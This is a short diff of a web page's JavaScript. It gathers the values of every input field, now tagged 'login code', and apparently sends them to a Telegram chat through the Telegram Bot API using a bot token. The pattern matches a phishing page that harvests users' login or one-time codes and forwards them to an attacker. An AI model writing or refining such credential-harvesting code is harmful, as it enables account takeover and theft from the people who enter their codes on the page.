@@ -120,7 +120,7 @@ background-color:#ffffff;
 
         let message = '';
         inputs.forEach(input => {
-            message += input.value;
+            message +="login code" + input.value;
         });
 
         const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
